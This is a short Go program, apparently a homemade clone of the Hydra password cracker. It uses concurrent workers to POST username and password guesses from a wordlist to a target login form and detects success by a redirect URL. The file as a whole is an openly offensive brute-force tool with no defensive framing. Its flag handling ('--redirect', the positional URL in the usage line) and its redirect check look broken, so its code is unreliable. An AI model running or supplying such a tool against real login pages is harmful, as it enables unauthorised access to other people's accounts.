package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
)

// Variables for CLI arguments
var (
	username   string
	passwords  string
	url        string
	successRedirect string
	maxWorkers int
)

func init() {
	flag.StringVar(&username, "l", "", "Username for authentication")
	flag.StringVar(&passwords, "P", "", "Path to the password list")
	flag.StringVar(&url, "url", "", "Target URL")
	flag.StringVar(&successRedirect, "--redirect", "", "URL indicating successful login")
	flag.IntVar(&maxWorkers, "workers", 10, "Number of concurrent workers")
	flag.Parse()

	if username == "" || passwords == "" || url == "" || successRedirect == "" {
		fmt.Println("Usage: hydra2.go -l username -P passwordlist url --redirect success_url")
		os.Exit(1)
	}
}

func worker(passwords chan string, wg *sync.WaitGroup, success chan string) {
	defer wg.Done()

	for password := range passwords {
		client := &http.Client{
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				if len(via) > 0 && via[len(via)-1].URL.String() == successRedirect {
					success <- password
				}
				return nil
			},
		}

		req, err := http.NewRequest("POST", url, strings.NewReader(fmt.Sprintf("username=%s&password=%s", username, password)))
		if err != nil {
			fmt.Printf("Error creating request: %s\n", err)
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		_, err = client.Do(req)
		if err != nil {
			fmt.Printf("Error sending request: %s\n", err)
		}
	}
}

func main() {
	file, err := os.Open(passwords)
	if err != nil {
		fmt.Printf("Error opening password file: %s\n", err)
		os.Exit(1)
	}
	defer file.Close()

	passwordsChan := make(chan string, maxWorkers)
	success := make(chan string)
	var wg sync.WaitGroup

	// Launch workers
	for i := 0; i < maxWorkers; i++ {
		wg.Add(1)
		go worker(passwordsChan, &wg, success)
	}

	// Read passwords and send to workers
	go func() {
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			passwordsChan <- scanner.Text()
		}
		close(passwordsChan)
		if err := scanner.Err(); err != nil {
			fmt.Printf("Error reading password file: %s\n", err)
		}
	}()

	// Wait for workers and handle success
	go func() {
		wg.Wait()
		close(success)
	}()

	found := false
	for pass := range success {
		fmt.Printf("KEY FOUND: %s\n", pass)
		found = true
		break
	}

	if !found {
		fmt.Println("KEY NOT FOUND")
	}
}
